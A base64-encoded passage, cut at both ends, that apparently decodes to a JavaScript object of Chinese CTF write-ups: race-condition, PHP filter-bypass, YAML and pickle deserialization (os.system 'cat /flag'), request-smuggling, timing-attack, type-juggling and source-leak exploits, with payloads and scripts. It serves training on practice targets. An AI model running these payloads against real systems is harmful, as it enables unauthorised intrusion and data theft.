TkwRThcdTUyMDYgZmxhZ1x1MzAwMlxyXG5cclxuIyMgXHU2NTM2XHU4M0I3XHU3Njg0IGZsYWdcclxuXHJcbi0gXHU3NkY0XHU2M0E1XHU2NTg3XHU0RUY2XHU4QkZCXHU1M0Q2XHVGRjFBL2ZsYWcsIC9mbGFnLnR4dFxyXG4tIFx1NkU5MFx1NzgwMVx1NkNDNFx1OTczMlx1RkYxQS9hcHAvKi5waHAsIC8uZ2l0L2NvbmZpZ1xyXG4tIFx1OEZEMFx1ODg0Q1x1NzNBRlx1NTg4M1x1RkYxQS9wcm9jL3NlbGYvKiwgL3Byb2MvdmVyc2lvblxyXG5cclxuIyMgXHU4RTI5XHU1NzUxXHJcblxyXG4xLiAqKlx1NEUwMFx1NUYwMFx1NTlDQlx1NkI3Qlx1NzhENSBIVFRQIFx1NTM0Rlx1OEJBRSoqXHVGRjBDXHU2RDZBXHU4RDM5XHU0RTg2XHU1Rjg4XHU1OTFBXHU2NUY2XHU5NUY0XHU1NzI4IElQIFx1OUVEMVx1NTQwRFx1NTM1NVx1N0VENVx1OEZDN1x1NEUwQVxyXG4yLiAqKmZpbGU6Ly8gXHU3Njg0XHU1OTFBXHU5MUNEXHU4REVGXHU1Rjg0KipcdUZGMUEvZmxhZyBcdTRFMERcdTVCNThcdTU3MjhcdTY1RjZcdThCRDVcdThCRDUgL2FwcC9mbGFnXHUzMDAxL3Zhci93d3cvZmxhZ1xyXG5gXHJcbiAgfSxcclxuICBxYzczNDoge1xyXG4gICAgdGl0bGU6ICdRaW5nQ2VuICM3MzQgLS0gUmFjZSBDb25kaXRpb24nLFxyXG4gICAgc3VidGl0bGU6ICdhaW9odHRwIFx1NUU3Nlx1NTNEMVx1NTIzN1x1NzlFRlx1NTIwNicsXHJcbiAgICBpY29uOiAnWmFwJyxcclxuICAgIGNvbG9yOiAnb3JhbmdlJyxcclxuICAgIGNvbnRlbnQ6IGBcclxuIyBRaW5nQ2VuICM3MzQgLS0gUmFjZSBDb25kaXRpb25cclxuXHJcbioqXHU5Nzc2XHU1NzNBKio6IGRvY2tlci5xaW5nY2VuLm5ldDozMDA1M1xyXG4qKlx1N0M3Qlx1NTc4QioqOiBXZWIgLyBcdTY3NjFcdTRFRjZcdTdBREVcdTRFODlcclxuKipcdTk2QkVcdTVFQTYqKjogTWVkaXVtXHJcblxyXG4jIyBcdTZGMEZcdTZEMUVcdTUyMDZcdTY3OTBcclxuXHJcblx1NzlFRlx1NTIwNlx1NTU0Nlx1NTdDRVx1NzY4NFx1NTE1MVx1NjM2Mlx1NjNBNVx1NTNFM1x1NUI1OFx1NTcyOFx1N0VDRlx1NTE3OFx1NzY4NCBUT0NUT1UgXHU2RjBGXHU2RDFFXHVGRjFBXHU2NzBEXHU1MkExXHU3QUVGXHU1MTQ4XHU2OEMwXHU2N0U1XHU0RjU5XHU5ODlEXHU1MThEXHU2MjYzXHU1MUNGXHVGRjBDXHU0RjQ2XHU0RTI0XHU0RTJBXHU2NENEXHU0RjVDXHU0RTRCXHU5NUY0XHU2Q0ExXHU2NzA5XHU5NTAxXHUzMDAyXHJcblxyXG4jIyBcdTUyMjlcdTc1MjhcdTY1QjlcdTVGMEZcclxuXHJcblxcYFxcYFxcYHB5dGhvblxyXG5pbXBvcnQgYXN5bmNpbywgYWlvaHR0cFxyXG5cclxuYXN5bmMgZGVmIHJlZGVlbShzZXNzaW9uKTpcclxuICAgIHRyeTpcclxuICAgICAgICBhc3luYyB3aXRoIHNlc3Npb24ucG9zdChmJ3tiYXNlfS9hcGkvcmVkZWVtJykgYXMgcjpcclxuICAgICAgICAgICAgcmV0dXJuIGF3YWl0IHIuanNvbigpXHJcbiAgICBleGNlcHQ6XHJcbiAgICAgICAgcmV0dXJuIHt9XHJcblxyXG5jb25uZWN0b3IgPSBhaW9odHRwLlRDUENvbm5lY3RvcihsaW1pdD0wKVxyXG5hc3luYyB3aXRoIGFpb2h0dHAuQ2xpZW50U2Vzc2lvbihjb25uZWN0b3I9Y29ubmVjdG9yKSBhcyBzOlxyXG4gICAgdGFza3MgPSBbcmVkZWVtKHMpIGZvciBfIGluIHJhbmdlKDMwMDApXVxyXG4gICAgcmVzdWx0cyA9IGF3YWl0IGFzeW5jaW8uZ2F0aGVyKCp0YXNrcylcclxuXFxgXFxgXFxgXHJcblxyXG4jIyBcdThFMjlcdTU3NTFcclxuXHJcbjEuICoqXHU0RTAwXHU1RjAwXHU1OUNCXHU1M0VBXHU3NTI4XHU0RTg2IHRocmVhZHMqKlx1RkYwQ1x1NUI5RVx1OTY0NSBhaW9odHRwIFx1NUYwMlx1NkI2NVx1NkJENFx1NTkxQVx1N0VCRlx1N0EwQlx1NjZGNFx1OUFEOFx1NjU0OFxyXG4yLiAqKlx1NkNBMVx1NjhDMFx1NjdFNVx1OEZENFx1NTZERVx1NTAzQ1x1NjgzQ1x1NUYwRioqXHVGRjBDXHU2NzA5XHU3Njg0XHU4RkQ0XHU1NkRFIDIwMCBcdTRGNDZcdTUxODVcdTVCQjlcdTY2MkYgZXJyb3JcclxuMy4gKipzZXNzaW9uIFx1NEYxQVx1OEZDN1x1NjcxRioqXHVGRjFBXHU1MjM3XHU1MjMwXHU0RTAwXHU1QjlBXHU3QTBCXHU1RUE2IHNlc3Npb24gXHU4OEFCXHU5NjUwXHU1MjM2XHJcbmBcclxuICB9LFxyXG4gIHFjNzQ3OiB7XHJcbiAgICB0aXRsZTogJ1FpbmdDZW4gIzc0NyAtLSBQSFAgRmlsdGVyIEJ5cGFzcycsXHJcbiAgICBzdWJ0aXRsZTogJ1x1NTkyN1x1NUMwRlx1NTE5OVx1N0VENVx1OEZDNyArIFVSTFx1N0YxNlx1NzgwMScsXHJcbiAgICBpY29uOiAnQ29kZScsXHJcbiAgICBjb2xvcjogJ3B1cnBsZScsXHJcbiAgICBjb250ZW50OiBgXHJcbiMgUWluZ0NlbiAjNzQ3IC0tIFBIUCBGaWx0ZXIgQnlwYXNzXHJcblxyXG4qKlx1OTc3Nlx1NTczQSoqOiBkb2NrZXIucWluZ2Nlbi5uZXQ6MzgwNzNcclxuKipcdTdDN0JcdTU3OEIqKjogV2ViIC8gUEhQIEZpbHRlciBCeXBhc3NcclxuKipcdTk2QkVcdTVFQTYqKjogTWVkaXVtXHJcblxyXG4jIyBXQUYgXHU4OUM0XHU1MjE5XHJcblxyXG58IFx1OEZDN1x1NkVFNFx1OEJDRCB8IFx1ODlFNlx1NTNEMVx1NEZFMVx1NjA2RiB8IFx1N0VENVx1OEZDN1x1NjVCOVx1NkNENSB8XHJcbnwtLS0tLS0tLXwtLS0tLS0tLS0tfC0tLS0tLS0tLS18XHJcbnwgcGhwIHwgXCJwaHAgbm90IGFsbG93ZWRcIiB8IFx1NTkyN1x1NTE5OSBQSFAgLyBQaHAgLyBwSHAgfFxyXG58IGRhdGEgfCBcImRhdGEgbm90IGFsbG93ZWRcIiB8IFVSTCBcdTdGMTZcdTc4MDEgfFxyXG58IGZsYWcgfCBcImZpbGUgbm90IGFsbG93ZWRcIiB8IFx1N0YxNlx1NzgwMVx1NTM1NVx1NUI1N1x1N0IyNiAlNjZsYWcgfFxyXG5cclxuIyMgXHU3RUQ1XHU4RkM3XHU4RkM3XHU3QTBCXHJcblxyXG4jIyMgMS4gXHU1OTI3XHU1QzBGXHU1MTk5XHU3RUQ1XHU4RkM3IHBocFxyXG5cclxuXFxgXFxgXFxgYmFzaFxyXG5QSFA6Ly9maWx0ZXIvY29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPXBhZ2VzL2ZsYWcuaHRtbFxyXG5cXGBcXGBcXGBcclxuXHJcbiMjIyAyLiBVUkwgXHU3RjE2XHU3ODAxXHU3RUQ1XHU4RkM3IGZsYWdcclxuXHJcblxcYFxcYFxcYGJhc2hcclxuJTY2bGFnLmh0bWxcclxuZmxhJTY3Lmh0bWxcclxuZmwlNjFnLmh0bWxcclxuXFxgXFxgXFxgXHJcblxyXG4jIyBcdTUxNzNcdTk1MkUgUGF5bG9hZFxyXG5cclxuXFxgXFxgXFxgYmFzaFxyXG5QSFA6Ly9maWx0ZXIvY29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPXBhZ2VzLyU2NiU2YyU2MSU2Ny5odG1sXHJcblxcYFxcYFxcYFxyXG5cclxuIyMgXHU3RUNGXHU5QThDXHJcblxyXG4xLiBcdTU5MjdcdTVDMEZcdTUxOTlcdTUzRDhcdTRGNTNcdUZGMUFQSFAgLT4gUGhwIC0+IHBIcCAtPiBwaFBcclxuMi4gVVJMIFx1N0YxNlx1NzgwMVx1RkYxQVx1NTM1NVx1NUI1N1x1ODI4Mlx1N0YxNlx1NzgwMVx1NkJENFx1NTNDQ1x1NUI1N1x1ODI4Mlx1NjZGNFx1OTY5MFx1ODUzRFxyXG4zLiBcdTUxNDhcdThCRkIgaW5kZXgucGhwIFx1Nzg2RVx1OEJBNFx1OERFRlx1NUY4NFx1RkYwQ1x1NTE4RFx1NUI5QVx1NTQxMVx1NjUzQlx1NTFGQlxyXG5gXHJcbiAgfSxcclxuICBcInJlLXBsemRlYnVnbWVcIjoge1xyXG4gICAgdGl0bGU6ICdbcmVdIHBsemRlYnVnbWUgXHUyMDE0IFx1OEMwM1x1OEJENVx1NEYxOFx1NTE0OCcsXHJcbiAgICBzdWJ0aXRsZTogJ0xpbnV4IEVMRiBSRSBcdTAwQjcgXHU1QzQyXHU1QzQyXHU4OUUzXHU1QkM2IFx1MDBCNyBHREIgYnJlYWsgb24geDByKCknLFxyXG4gICAgaWNvbjogJ1NoaWVsZCcsXHJcbiAgICBjb2xvcjogJ3JlZCcsXHJcbiAgICBjb250ZW50OiBgXHJcblx1OTg5OFx1NzZFRVx1N0VEOVx1NEU4Nlx1NEUwMFx1NEUyQSBMaW51eCB4NjQgRUxGXHVGRjBDXHU1NDBEXHU1QjU3XHU1QzMxXHU2NjJGIFwicGx6IGRlYnVnIG1lXCJcdTMwMDJcdTk4OThcdTc2RUVcdTYzRDBcdTc5M0FcdTc2RjRcdTYzQTUgYnJlYWsgXHU1NzI4IFxcYHgwcigpXFxgIFx1NEUwQVx1RkYwQ1x1NjU3NFx1NEY1M1x1NjAxRFx1OERFRlx1RkYxQVx1OEY5M1x1NTE2NSBcdTIxOTIgUkM0IFx1MjE5MiBBRVMtMTI4LUVDQiBcdTIxOTIgQlRFQSBcdTIxOTIgXFxgeDByKClcXGAgXHUyMTkyIFx1NEUwRSBCU1MgXHU0RTJEXHU3Njg0IGZsYWcgXHU2QkQ0XHU4RjgzXHUzMDAyXHJcblxyXG4jIyBcdTUxNzNcdTk1MkVcdTdFQkZcdTdEMjJcclxuLSBcdTYzRDBcdTc5M0FcdTkxQ0NcdTY2MEVcdTc4NkVcdTUxOTlcdTRFODZcdUZGMUEqKmJyZWFrIG9uIHgwcigpKipcclxuLSBcdTRFOENcdThGREJcdTUyMzZcdTkxQ0NcdTU0MENcdTRFMDBcdTU5NTdcdTg5RTNcdTVCQzZcdTZENDFcdTdBMEJcdTRGMUFcdTVCRjlcdTRFMjRcdTRFMkFcdTdGMTNcdTUxQjJcdTUzM0FcdTUwNUFcdTVCRjlcdTc5RjBcdTU5MDRcdTc0MDZcdUZGMUFcdTRFMDBcdTRFMkFcdTY2MkZcdThGOTNcdTUxRkFcdTUyMzAgXFxgZmxhZ1xcYCBcdTY1NzBcdTdFQzRcdUZGMENcdTUzRTZcdTRFMDBcdTRFMkFcdTY2MkYgQlNTIFx1NEUyRFx1NzY4NCBcXGBmbGFnXFxgIFx1NkJENFx1OEY4M1x1N0YxM1x1NTFCMlx1NTMzQVx1MzAwMlxyXG5cclxuIyMgR0RCIFx1OEMwM1x1OEJENVxyXG5cclxuXHU1NzI4IEthbGkgXHU5MUNDXHU3NkY0XHU2M0E1XHU2MjY3XHU4ODRDXHVGRjFBXHJcblxcYFxcYFxcYGJhc2hcclxuZ2RiIC1iYXRjaCAteCBwbHpkYi5nZGIgLi9wbHpkZWJ1Z21lXHJcblxcYFxcYFxcYFxyXG5cclxucGx6ZGIuZ2RiIFx1NTE4NVx1NUJCOVx1RkYxQVxyXG5cXGBcXGBcXGBcclxuYnJlYWsgeDByXHJcbnJ1blxyXG5maW5pc2hcclxueC8zMmdiICZmbGFnXHJcbngvcyAmZmxhZ1xyXG5jb250aW51ZVxyXG5cXGBcXGBcXGBcclxuXHJcbiMjIEZsYWdcclxuXFxgXFxgXFxgXHJcbmZsYWd7SXQzX0QzYnVnR19UMTFtZSFfbGUzX3BsYXl9XHJcblxcYFxcYFxcYFxyXG5cclxuIyMgXHU3RUNGXHU5QThDXHU2MDNCXHU3RUQzXHJcblx1OEZEOVx1OTg5OFx1NjBGM1x1NUYzQVx1OEMwM1x1NzY4NFx1NEUwMFx1Njc2MVx1OTc1RVx1NUUzOFx1NjczNFx1N0QyMFx1RkYxQVx1OTg5OFx1NzZFRVx1NURGMlx1N0VDRlx1N0VEOVx1NTFGQVx1Njc4MVx1NUYzQVx1NzY4NFx1NjRDRFx1NEY1Q1x1NjNEMFx1NzkzQVx1NjVGNlx1RkYwQ1x1NEUwRFx1ODk4MVx1Nzg2Q1x1NTIxQVx1N0VBRlx1OTc1OVx1NjAwMVx1RkYwQ1x1NzZGNFx1NjNBNVx1NjVBRFx1NzBCOVx1NjYyRlx1NjcwMFx1NUZFQlx1NzY4NFx1OERFRlx1MzAwMlx1NUMyNFx1NTE3Nlx1NjYyRlx1OEZEOVx1NzlDRFx1NTkxQVx1NUM0Mlx1NUQ0Q1x1NTk1N1x1OTAwNlx1NTNEOFx1N0VEM1x1Njc4NFx1RkYwQ1x1Nzg2Q1x1NjNBOFx1NEUwMFx1NjVFNlx1NjdEMFx1NEUyQVx1NUUzOFx1OTFDRlx1NzcwQlx1OTUxOVx1RkYwQ1x1NTQwRVx1OTc2Mlx1NzY4NFx1OUE4Q1x1OEJDMVx1NUMzMVx1NTE2OFx1OTUxOVx1MzAwMlxyXG5gXHJcbiAgfSxcclxuICB5YW1sOiB7XHJcbiAgICB0aXRsZTogJ1x1NTVCNVx1NTVCNVx1NUJBMFx1NzI2OVx1NTMzQlx1OTY2MiAtLSBZQU1MIFx1NTNDRFx1NUU4Rlx1NTIxN1x1NTMxNiBSQ0UnLFxyXG4gICAgc3VidGl0bGU6ICdQeVlBTUwgXHU2ODA3XHU3QjdFXHU3RUQ1XHU4RkM3JyxcclxuICAgIGljb246ICdaYXAnLFxyXG4gICAgY29sb3I6ICdvcmFuZ2UnLFxyXG4gICAgY29udGVudDogYFxyXG4jIFx1NTVCNVx1NTVCNVx1NUJBMFx1NzI2OVx1NTMzQlx1OTY2MiAtLSBZQU1MIFx1NTNDRFx1NUU4Rlx1NTIxN1x1NTMxNiBSQ0VcclxuXHJcbioqXHU5Nzc2XHU1NzNBKio6IDE3NS4yNy4yNTEuMTIyOjEwMDAxXHJcbioqXHU3QzdCXHU1NzhCKio6IE1pc2MgLyBJbnNlY3VyZSBEZXNlcmlhbGl6YXRpb25cclxuKipcdTk2QkVcdTVFQTYqKjogTWVkaXVtXHJcblxyXG4jIyBcdTZGMEZcdTZEMUVcdTcwQjlcclxuXHJcblxcYFxcYFxcYHB5dGhvblxyXG55YW1sLmxvYWQodXNlcl9pbnB1dCkgICMgXHU2NzJBXHU2MzA3XHU1QjlBIExvYWRlclxyXG5cXGBcXGBcXGBcclxuXHJcbiMjIFx1NTIyOVx1NzUyOCBQYXlsb2FkXHJcblxyXG5cXGBcXGBcXGB5YW1sXHJcbiEhcHl0aG9uL29iamVjdC9hcHBseTpvcy5zeXN0ZW1cclxuYXJnczogWydjYXQgL2ZsYWcnXVxyXG5cXGBcXGBcXGBcclxuXHJcbiMjIFx1NTkxQVx1N0FFRlx1NTNFM1x1NjM5Mlx1NjdFNVxyXG5cclxuLSAxMDAwMTogXHU4RkM3XHU2RUU0XHU0RTg2ICEhcHl0aG9uL29iamVjdC9hcHBseVxyXG4tIDEwMDAyOiBcdTkwRThcdTUyMDZcdThGQzdcdTZFRTRcclxuLSAxMDAwMzogXHU3NkY0XHU2M0E1XHU1M0VGXHU2MjY3XHU4ODRDXHJcblxyXG4jIyBcdThFMjlcdTU3NTFcclxuXHJcbjEuIFx1OEY3RFx1ODM3N1x1NjgzQ1x1NUYwRlx1RkYxQUpTT04gXHU4RjZDXHU0RTQ5XHU1NDBFIFlBTUwgXHU1OTFBXHU4ODRDIHBheWxvYWQgXHU5NzAwXHU4OTgxXHU2QjYzXHU3ODZFXHU2MzYyXHU4ODRDXHJcbjIuIFx1N0YxNlx1NzgwMVx1RkYxQXN5cy5zdGRvdXQucmVjb25maWd1cmUoZW5jb2Rpbmc9J3V0Zi04JykgXHU4OUUzXHU1MUIzXHU0RTJEXHU2NTg3XHU4RjkzXHU1MUZBXHJcbmBcclxuICB9LFxyXG4gIHFjNzMzOiB7XHJcbiAgICB0aXRsZTogJ1FpbmdDZW4gIzczMyAtLSBXZWJTb2NrZXQgLyBYWEUgLyBQaWNrbGUgLyBTbXVnZ2xlJyxcclxuICAgIHN1YnRpdGxlOiAnXHU1OTFBXHU1QzQyXHU1MzRGXHU4QkFFXHU0RTBFXHU1M0NEXHU1RThGXHU1MjE3XHU1MzE2JyxcclxuICAgIGljb246ICdaYXAnLFxyXG4gICAgY29sb3I6ICdyZWQnLFxyXG4gICAgY29udGVudDogYFxyXG4jIFFpbmdDZW4gIzczMyAtLSBcdTU5MUFcdTVDNDJcdTUzNEZcdThCQUVcdTRFMEVcdTUzQ0RcdTVFOEZcdTUyMTdcdTUzMTZcclxuXHJcbioqXHU5Nzc2XHU1NzNBKio6IGRvY2tlci5xaW5nY2VuLm5ldDo0MjQyMFxyXG4qKlx1N0M3Qlx1NTc4QioqOiBXZWIgLyBcdTUzNEZcdThCQUUgKyBcdTUzQ0RcdTVFOEZcdTUyMTdcdTUzMTZcclxuKipcdTk2QkVcdTVFQTYqKjogSGFyZFxyXG5cclxuIyMgV2ViU29ja2V0IFx1NTM0N1x1N0VBN1x1NjNBMlx1NkQ0QlxyXG5cclxuXFxgXFxgXFxgcHl0aG9uXHJcbmltcG9ydCBzb2NrZXRcclxucyA9IHNvY2tldC5zb2NrZXQoKVxyXG5zLmNvbm5lY3QoKCdkb2NrZXIucWluZ2Nlbi5uZXQnLCA0MjQyMCkpXHJcbnMuc2VuZChcclxuICAgICdHRVQgLyBIVFRQLzEuMVxcXFxyXFxcXG4nXHJcbiAgICAnSG9zdDogZG9ja2VyLnFpbmdjZW4ubmV0OjQyNDIwXFxcXHJcXFxcbidcclxuICAgICdVcGdyYWRlOiB3ZWJzb2NrZXRcXFxcclxcXFxuJ1xyXG4gICAgJ0Nvbm5lY3Rpb246IFVwZ3JhZGVcXFxcclxcXFxuJ1xyXG4gICAgJ1NlYy1XZWJTb2NrZXQtS2V5OiBkR2hsSUhOaGJYQnNaU0J1YjI1alpRPT1cXFxcclxcXFxuJ1xyXG4gICAgJ1NlYy1XZWJTb2NrZXQtVmVyc2lvbjogMTNcXFxcclxcXFxuJ1xyXG4gICAgJ1xcXFxyXFxcXG4nXHJcbilcclxuXFxgXFxgXFxgXHJcblxyXG4jIyBQaWNrbGUgXHU1M0NEXHU1RThGXHU1MjE3XHU1MzE2XHJcblxyXG5cXGBcXGBcXGBweXRob25cclxuaW1wb3J0IHBpY2tsZSwgb3NcclxuY2xhc3MgRXhwbG9pdDpcclxuICAgIGRlZiBfX3JlZHVjZV9fKHNlbGYpOlxyXG4gICAgICAgIHJldHVybiAob3Muc3lzdGVtLCAoJ2NhdCAvZmxhZycsKSlcclxucGF5bG9hZCA9IHBpY2tsZS5kdW1wcyhFeHBsb2l0KCkpXHJcblxcYFxcYFxcYFxyXG5cclxuIyMgSFRUUCBcdThCRjdcdTZDNDJcdThENzBcdTc5QzFcclxuXHJcblxcYFxcYFxcYGh0dHBcclxuUE9TVCAvIEhUVFAvMS4xXHJcbkhvc3Q6IHRhcmdldFxyXG5Db250ZW50LUxlbmd0aDogNlxyXG5UcmFuc2Zlci1FbmNvZGluZzogY2h1bmtlZFxyXG5cclxuMFxyXG5cclxuR0VUIC9hZG1pbiBIVFRQLzEuMVxyXG5cXGBcXGBcXGBcclxuYFxyXG4gIH0sXHJcbiAgdGltaW5nOiB7XHJcbiAgICB0aXRsZTogJ0NURlNob3cgLS0gVGltaW5nIEF0dGFjaycsXHJcbiAgICBzdWJ0aXRsZTogJ1x1NjVGNlx1OTVGNFx1NEZBN1x1NEZFMVx1OTA1M1x1NTIwNlx1Njc5MCcsXHJcbiAgICBpY29uOiAnWmFwJyxcclxuICAgIGNvbG9yOiAneWVsbG93JyxcclxuICAgIGNvbnRlbnQ6IGBcclxuIyBDVEZTaG93IC0tIFRpbWluZyBBdHRhY2tcclxuXHJcbioqXHU5Nzc2XHU1NzNBKio6IGN0Zi5zaG93XHJcbioqXHU3QzdCXHU1NzhCKio6IENyeXB0byAvIFNpZGUgQ2hhbm5lbFxyXG4qKlx1OTZCRVx1NUVBNioqOiBNZWRpdW1cclxuXHJcbiMjIFx1NTM5Rlx1NzQwNlxyXG5cclxuXHU5MDEwXHU1QjU3XHU4MjgyXHU2QkQ0XHU4RjgzXHU2NUY2XHVGRjBDXHU2QkNGXHU0RTJBXHU1QjU3XHU4MjgyXHU3MzFDXHU1QkY5XHU0RjFBXHU1OTFBXHU2MjY3XHU4ODRDXHU0RTAwXHU2QjIxXHU1RkFBXHU3M0FGXHVGRjBDXHU1NENEXHU1RTk0XHU2NUY2XHU5NUY0XHU2NkY0XHU5NTdGXHUzMDAyXHJcblxyXG5cXGBcXGBcXGBweXRob25cclxuaW1wb3J0IHJlcXVlc3RzLCB0aW1lXHJcbmJhc2UgPSAnaHR0cHM6Ly9jdGYuc2hvdy9jaGFsbGVuZ2UvdGltaW5nJ1xyXG5jaGFyc2V0ID0gJ2FiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6MDEyMzQ1Njc4OSdcclxucGFzc3dvcmQgPSAnJ1xyXG5mb3IgcG9zIGluIHJhbmdlKDMyKTpcclxuICAgIHRpbWVzID0ge31cclxuICAgIGZvciBjIGluIGNoYXJzZXQ6XHJcbiAgICAgICAgZ3Vlc3MgPSBwYXNzd29yZCArIGNcclxuICAgICAgICB0MCA9IHRpbWUudGltZSgpXHJcbiAgICAgICAgcmVxdWVzdHMucG9zdChiYXNlLCBkYXRhPXsncGFzc3dvcmQnOiBndWVzc30pXHJcbiAgICAgICAgdGltZXNbY10gPSB0aW1lLnRpbWUoKSAtIHQwXHJcbiAgICBiZXN0ID0gbWF4KHRpbWVzLCBrZXk9dGltZXMuZ2V0KVxyXG4gICAgcGFzc3dvcmQgKz0gYmVzdFxyXG5cXGBcXGBcXGBcclxuXHJcbiMjIFx1NTE3M1x1OTUyRVx1NjI4MFx1NURFN1xyXG5cclxuMS4gKipcdTY1RjZcdTk1RjRcdTVGNTJcdTRFMDBcdTUzMTYqKlx1RkYxQVx1NTFDRlx1NTNCQlx1NTdGQVx1Nzg0MFx1NTRDRFx1NUU5NFx1NjVGNlx1OTVGNFx1NTE4RFx1NzcwQlx1NTg5RVx1OTFDRlxyXG4yLiAqKlx1NTkxQVx1NkIyMVx1OTFDN1x1NjgzNyoqXHVGRjFBXHU2QkNGXHU0RTJBXHU1QjU3XHU3QjI2XHU2RDRCIDEwLTIwIFx1NkIyMVx1NTNENlx1NUU3M1x1NTc0N1x1NTAzQ1xyXG4zLiAqKlx1OTA3Rlx1NUYwMFx1N0Y1MVx1N0VEQ1x1NkNFMlx1NTJBOCoqXHVGRjFBXHU1NzI4XHU3QTMzXHU1QjlBXHU2NUY2XHU2QkI1XHU4REQxXHVGRjBDXHU1MUNGXHU1QzExXHU1NjZBXHU5N0YzXHJcbmBcclxuICB9LFxyXG4gIHR5cGVqdWdnbGluZzoge1xyXG4gICAgdGl0bGU6ICdDVEZTaG93IC0tIFBIUCBUeXBlIEp1Z2dsaW5nJyxcclxuICAgIHN1YnRpdGxlOiAnXHU1RjMxXHU3QzdCXHU1NzhCXHU1NEM4XHU1RTBDXHU3RUQ1XHU4RkM3JyxcclxuICAgIGljb246ICdDb2RlJyxcclxuICAgIGNvbG9yOiAncHVycGxlJyxcclxuICAgIGNvbnRlbnQ6IGBcclxuIyBDVEZTaG93IC0tIFBIUCBUeXBlIEp1Z2dsaW5nXHJcblxyXG4qKlx1OTc3Nlx1NTczQSoqOiBjdGYuc2hvd1xyXG4qKlx1N0M3Qlx1NTc4QioqOiBXZWIgLyBQSFAgV2VhayBUeXBpbmdcclxuKipcdTk2QkVcdTVFQTYqKjogTWVkaXVtXHJcblxyXG4jIyAwZSBcdTdFRDVcdThGQzdcclxuXHJcblxcYFxcYFxcYHB5dGhvblxyXG5pbXBvcnQgaGFzaGxpYlxyXG5mb3IgaSBpbiByYW5nZSgxMDAwMDAwMCk6XHJcbiAgICBzID0gc3RyKGkpXHJcbiAgICBoID0gaGFzaGxpYi5tZDUocy5lbmNvZGUoKSkuaGV4ZGlnZXN0KClcclxuICAgIGlmIGguc3RhcnRzd2l0aCgnMGUnKSBhbmQgaFsyOl0uaXNkaWdpdCgpOlxyXG4gICAgICAgIHByaW50KGYnTWF0Y2g6IHtzfSAtPiB7aH0nKVxyXG5cXGBcXGBcXGBcclxuXHJcblx1NURGMlx1NzdFNVx1NzhCMFx1NjQ5RVx1RkYxQVxyXG4tIFFOS0NEWk8gLT4gMGU0NjIwOTc0MzE5MDY1MDkwMTk1NjI5ODg3MzY4NTRcclxuLSAyNDA2MTA3MDggLT4gMGU0NjIwOTc0MzE5MDY1MDkwMTk1NjI5ODg3MzY4NTRcclxuXHJcbiMjIFx1NjU3MFx1N0VDNFx1N0VENVx1OEZDNyAoPT09KVxyXG5cclxuXFxgXFxgXFxgcGhwXHJcbj9hW109MSZiW109MlxyXG5cXGBcXGBcXGBcclxuXHJcbiMjIFx1N0VDRlx1OUE4Q1xyXG5cclxuMS4gXHU1MTQ4XHU1MjI0XHU2NUFEID09IFx1OEZEOFx1NjYyRiA9PT1cclxuMi4gMGUgXHU1MjREXHU3RjAwXHU0RjE4XHU1MTQ4XHU2MjdFXHU3N0VEXHU1QjU3XHU3QjI2XHU0RTMyXHU3OEIwXHU2NDlFXHJcbjMuIEpTT04gXHU1RDRDXHU1OTU3XHU3NTI4XHU0RThFXHU1OTFBXHU1QzQyXHU2QkQ0XHU4RjgzXHJcbmBcclxuICB9LFxyXG4gIHNvdXJjZWxlYWs6IHtcclxuICAgIHRpdGxlOiAnQ1RGU2hvdyAtLSBTb3VyY2UgQ29kZSBMZWFrJyxcclxuICAgIHN1YnRpdGxlOiAnXHU2RTkwXHU3ODAxXHU2Q0M0XHU5NzMyXHU0RTBFXHU1OTA3XHU0RUZEXHU2NTg3XHU0RUY2JyxcclxuICAgIGljb246ICdGaWxlVGV4dCcsXHJcbiAgICBjb2xvcjogJ2N5YW4nLFxyXG4gICAgY29udGVudDogYFxyXG4jIENURlNob3cgLS0gU291cmNlIENvZGUgTGVha1xyXG5cclxuKipcdTk3NzZcdTU3M0EqKjogY3RmLnNob3dcclxuKipcdTdDN0JcdTU3OEIqKjogV2ViIC8gSW5mb3JtYXRpb24gTGVha2FnZVxyXG4qKlx1OTZCRVx1NUVBNioqOiBFYXN5XHJcblxyXG4jIyBcdTVFMzhcdTg5QzFcdTZDQzRcdTk3MzJcdTcwQjlcclxuXHJcblxcYFxcYFxcYGJhc2hcclxud3d3LnppcCAvIGJhY2t1cC56aXAgLyBzaXRlLnRhci5nelxyXG5pbmRleC5waHAuc3dwIC8gaW5kZXgucGhwLnN3b1xyXG4vLmdpdC9IRUFEIC8gLy5naXQvY29uZmlnXHJcblxcYFxcYFxcYFxyXG5cclxuIyMgXHU1MjI5XHU3NTI4XHU2RDQxXHU3QTBCXHJcblxyXG4xLiBcdTc2RUVcdTVGNTVcdTYyNkJcdTYzQ0ZcdUZGMUFkaXJzZWFyY2ggLyBnb2J1c3RlclxyXG4yLiBcdTY1NEZcdTYxMUZcdTY1ODdcdTRFRjZcdUZGMUEuZ2l0L2NvbmZpZywgLmVudiwgd2ViLmNvbmZpZ1xyXG4zLiBcdTUzOEJcdTdGMjlcdTUzMDVcdUZGMUFcdThCRDUgemlwL3Rhci9neiBcdTU0MEVcdTdGMDBcclxuNC4gZ2l0IGxvZ1x1RkYxQVx1NjI3RVx1NTIzMFx1NjVFN1x1NzI0OFx1NjcyQ1x1NjI3RSBmbGFnXHJcbmBcclxuICB9LFxyXG4gIHNpZ2ZvcmdlOiB7XHJcbiAgICB0aXRsZTogJ0hNQUMgU2lnbmF0dXJlIEZvcmdlcnknLFxyXG4gICAgc3VidGl0bGU6ICd6bGliICsgYmFzZTY0IFx1N0I3RVx1NTQwRFx1N0VENVx1OEZDNycsXHJcbiAgICBpY29uOiAnU2hpZWxkJyxcclxuICAgIGNvbG9yOiAnYmx1ZScsXHJcbiAgICBjb250ZW50OiBgXHJcbiMgSE1BQyBTaWduYXR1cmUgRm9yZ2VyeVxyXG5cclxuKipcdTk3NzZcdTU3M0EqKjogY3RmLnNob3dcclxuKipcdTdDN0JcdTU3OEIqKjogQ3J5cHRvIC8gU2lnbmF0dXJlIEJ5cGFzc1xyXG4qKlx1OTZCRVx1NUVBNioqOiBIYXJkXHJcblxyXG4jIyBcdTdCN0VcdTU0MERcdTlBOENcdThCQzFcdTZENDFcdTdBMEJcclxuXHJcblxcYFxcYFxcYHB5dGhvblxyXG5pbXBvcnQgaG1hYywgaGFzaGxpYiwgemxpYlxyXG5kZWYgc2lnbihwYXJhbXMsIHNlY3JldCk6XHJcbiAgICBtc2cgPSAnJicuam9pbihmJ3trfT17dn0nIGZvciBrLHYgaW4gcGFyYW1zLml0ZW1zK